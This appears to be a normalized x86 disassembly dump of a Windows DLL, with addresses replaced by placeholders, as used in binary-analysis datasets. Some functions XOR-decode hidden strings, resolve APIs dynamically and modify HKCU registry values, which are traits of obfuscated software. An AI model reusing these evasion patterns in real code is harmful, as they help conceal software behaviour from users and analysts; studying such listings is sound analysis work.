call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_1001b650
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ esi + 0x10 ] eax
push 0xffffffff
push eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi ] al
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
mov ecx esi
call sub_1004efe0
mov eax esi
mov esp ebp
pop ebp
retn 0x4
sub_1001b67e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_1004a330
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_1003c746
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_1001b6d0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
xor edi edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov eax [ ebx ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x3b
call sub_10053240
mov ecx [ esi ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x4a
call sub_10053240
mov ecx [ esi + 0x8 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi ] edi
lea edx [ ebp - 0x2c ]
mov eax 0xbc
call sub_10053240
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x8 ] edi
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x61
call sub_10053240
mov [ esi + 0x10 ] eax
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0xc ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0xc ] edi
mov ecx [ ebx + 0xc ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x133
call sub_10053240
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x10 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x36
call sub_10053240
mov eax [ esi + 0x18 ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x14 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x14 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0x49
call sub_10053240
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x18 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x18 ] edi
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x131
call sub_10053240
mov [ esi + 0x50 ] eax
inc [ eax + 0x1c ]
jmp r-xdata
push ecx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push eax
mov [ esi + 0x1c ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x34 ]
mov [ esi + 0x1c ] edi
mov ecx [ ebx + 0x1c ]
mov [ ebp - 0x34 ] ecx
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xea
call sub_10053240
mov [ ebp - 0x34 ] eax
mov eax [ ebx + 0x54 ]
cmp eax edi
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x28 ]
mov [ esi + 0x28 ] ecx
mov eax [ ebx + 0x50 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0x34 ]
xor ecx ebp
mov [ esi + 0x34 ] edx
mov eax esi
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x30 ]
cmp ecx edi
je r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx ]
push eax
lea eax [ esi + 0x54 ]
call sub_1006d780
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
jne r-xdata
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push edi
push ecx
push eax
mov [ esi + 0x30 ] eax
call sub_1007f5d0
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x34 ]
mov [ esi + 0x30 ] edi
mov edx [ ebx + 0x38 ]
mov [ esi + 0x38 ] edx
mov eax [ ebx + 0x40 ]
mov [ esi + 0x40 ] eax
mov ecx [ ebx + 0x44 ]
mov [ esi + 0x44 ] ecx
mov edx [ ebx + 0x48 ]
mov [ esi + 0x48 ] edx
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4c ] eax
mov ecx [ ebx + 0x2c ]
mov [ esi + 0x2c ] ecx
mov edx [ ebx + 0x24 ]
mov [ esi + 0x24 ] edx
mov eax [ ebx + 0x30 ]
mov [ ebp - 0x34 ] eax
cmp eax edi
je r-xdata
sub_1001ba50
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0xd3
inc cl
mov [ ebp + eax - 0x24 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x19 ] 0x0
call [ LoadLibraryA@IAT ]
mov ebx eax
mov [ ebp - 0x40 ] ebx
test ebx ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0x2d
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp - 0x7 ] 0x0
call esi
mov [ ebp - 0x44 ] eax
test eax eax
jne r-xdata
push edi
lea edi [ ebp - 0x18 ]
mov eax 0x53
call sub_1005b580
mov ecx edi
push ecx
push ebx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x30 ]
mov eax 0x24
call sub_1005b580
mov eax [ ebp - 0x40 ]
mov edx edi
push edx
push eax
call esi
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x3 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x3c ]
push ecx
push 0xffffffff
push sub_1005ff80
push sub_10063000
push sub_1001d940
push sub_100181a0
push sub_100599a0
push sub_1005af50
push sub_1004deb0
call [ ebp - 0x44 ]
mov esi eax
add esp 0x24
test esi esi
jne r-xdata
lea eax [ edi + 0x4 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push sub_10034950
push 0x0
push r--data
push r--data
push esi
call ebx
add esp 0x1c
push esi
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x5 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call edi
mov edx [ ebp - 0x40 ]
add esp 0x4
push edx
call [ FreeLibrary@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
call edi
add esp 0x4
pop edi
pop esi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1001bc10
push ebp
mov ebp esp
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc8
and edx 0xff
mov [ ebp + eax * 2 - 0x8c ] dx
inc eax
cmp eax 0x29
jb r-xdata
push edi
mov edi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0xe4 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x8c ]
push edx
push 0x80000001
mov [ ebp - 0x3a ] ax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x38
mov [ ebp - 0xf0 ] 0x4
mov [ ebp - 0xe8 ] 0x0
call sub_10045930
lea eax [ ebp - 0xf0 ]
push eax
mov eax [ ebp - 0xe4 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push esi
mov esi [ RegCloseKey@IAT ]
push edx
call esi
lea edx [ ebp - 0xe0 ]
mov eax 0x55
call sub_10045930
lea eax [ ebp - 0xe4 ]
push eax
push 0x2
push 0x0
mov ecx edx
push ecx
push 0x80000001
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0xe8 ]
cmp eax 0x1
je r-xdata
mov ecx [ ebp - 0xe4 ]
push 0x4
lea edx [ ebp - 0xec ]
push edx
push 0x4
push 0x0
lea eax [ ebp - 0x38 ]
push eax
push ecx
mov [ ebp - 0xec ] 0x1
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop esi
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xe4 ]
push ecx
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call esi
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xe4 ]
push edx
call esi
pop esi
mov eax 0x3
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1001bdc0
push ebp
mov ebp esp
and esp 0xfffffff8
and eax 0x17
sub esp 0x18
mov [ ecx + 0xc ] eax
mov ecx [ ecx + 0x10 ]
and ecx eax
push esi
push edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov esi 0x1
test cl 0x4
je r-xdata
push 0x0
push 0x0
call sub_10024fe9
test cl 0x2
je r-xdata
call sub_100577ef
mov edi eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] r--data
call sub_10069ac6
push r--data
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10024fe9
call sub_100577ef
lea ecx [ esp + 0x8 ]
push ecx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_10069ac6
push r--data
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10024fe9
call sub_100577ef
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x10 ]
mov edi eax
mov [ esp + 0xc ] r--data
call sub_10069ac6
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] r--data
call sub_10024fe9
sub_1001bed9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sub edi [ ebp + 0x8 ]
sar esi 0x1
sar edi 0x1
or ebx 0xffffffff
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_10062fa9
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
call sub_1002fb6b
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi edi
ja r-xdata
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
push edi
push eax
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0xc ]
call sub_100699c1
mov ebx eax
xor eax eax
add esp 0x18
cmp ebx eax
jne r-xdata
mov ebx esi
jmp r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007f5d0
add esp 0xc
jbe r-xdata
push eax
push eax
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
call sub_100699c1
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
call sub_10035d06
pop ecx
mov ecx [ ebp + 0x14 ]
movzx ecx [ eax + ecx ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 2 ] cx
inc eax
cmp eax ebx
jb r-xdata
mov ebx 0x7fffffff
jmp r-xdata
sub_1001bf9b
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006f705
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1001c038
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100476aa
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10007908
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100528c9
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_1001c100
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10052e20
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1001c121
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_10017d97
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1001c160
push ebp
mov ebp esp
sub esp 0xf0c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0xf0c ] eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
push edi
lea edx [ ebp - 0xc4 ]
mov eax 0x7
call sub_10026210
lea edx [ ebp - 0x10 ]
mov eax 0x9
call sub_10026210
lea edx [ ebp - 0x48 ]
mov eax 0x5
call sub_10026210
mov eax edx
push eax
lea ecx [ ebp - 0xc4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov ecx 0x104
lea ebx [ ebp - 0x8e4 ]
call sub_1002cb70
add esp 0xc
lea eax [ ebp - 0xf00 ]
push eax
push 0x20119
push 0x0
mov ecx ebx
mov ebx [ RegOpenKeyExW@IAT ]
push ecx
push 0x80000001
call ebx
test eax eax
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xf00 ]
lea edx [ ebp - 0xf04 ]
push edx
lea eax [ ebp - 0xefc ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
mov [ ebp - 0xf04 ] 0x618
call [ RegQueryValueExW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov edx [ ebp - 0xf00 ]
push edx
call [ RegCloseKey@IAT ]
test edi edi
jne r-xdata
mov edi 0x2
lea eax [ ebp - 0xefc ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
lea eax [ edi + 0x1 ]
call sub_10026210
lea ecx [ ebp - 0xf04 ]
push ecx
push 0x20119
push edi
lea edx [ ebp - 0xc4 ]
push edx
push 0x80000001
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0xefc ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edi [ ebp - 0xf04 ]
mov eax 0x30c
call sub_10031460
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0xf04 ]
mov eax 0x8
call sub_10026210
lea edx [ ebp - 0xf00 ]
mov eax 0x2
call sub_10026210
lea edx [ ebp - 0xf08 ]
xor eax eax
call sub_10026210
push edx
push esi
call [ StrStrW@IAT ]
xor edi edi
lea ecx [ ebp - 0x6dc ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
sub esi ecx
lea ecx [ ecx ]
lea ebx [ ebp - 0xf00 ]
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xf0c ]
lea ecx [ ebp - 0xf08 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xf00 ]
push eax
call sub_1004e6c0
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea edx [ ebp - 0xf00 ]
push edx
call sub_1004e6c0
test eax eax
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0xf04 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x6dc ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ ebp - 0xf00 ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
lea eax [ ebp - 0xf08 ]
push eax
call sub_1004e6c0
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
mov edx ebx
push edx
lea eax [ ebp - 0xefc ]
push eax
call [ lstrcmpiW@IAT ]
neg eax
pop edi
sbb eax eax
pop ebx
inc eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1001c4c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_1000831a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_10016470
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_1001f230
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_10028f80
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x14
sub_1001c5e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088de7
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x144
xor ebx ebx
push ebx
mov edi ecx
mov [ ebp - 0xf0 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
mov eax [ edi + 0x10 ]
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0xe8 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0xec ]
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xe8 ] ebx
call sub_10023120
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0xec ]
cmp esi ebx
jne r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
mov eax 0x1
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
call sub_100285c0
mov edi eax
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0xf7
call sub_10045930
xor ecx ecx
mov eax edx
mov [ ebp - 0xb4 ] 0x7
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] cx
lea edx [ eax + 0x2 ]
lea ecx [ eax + eax ]
push esi
call sub_10070640
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
